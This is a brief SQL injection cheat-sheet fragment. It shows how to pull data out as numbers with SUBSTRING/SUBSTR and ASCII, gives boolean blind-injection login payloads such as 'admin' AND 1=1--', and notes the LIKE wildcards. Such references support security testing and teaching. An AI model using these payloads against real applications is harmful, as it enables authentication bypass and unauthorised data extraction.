Retrieving Data as Numbers
  • If there is no string column to return output
    • SUBSTRING('Admin',1,1)returns A (use SUBSTR for Oracle)
    • ASCII('A')returns 65
    • ASCII(SUBSTR('Admin',1,1))returns 65

Testing TRUEness and FALSEness for conditional response extraction
    • admin' AND 1=1--(login succeded)
    • admin' AND 1=2--(login failed)

Using wildcard characters if there is LIKE in SQL statement
  • % matches any string
  • _ matches any character
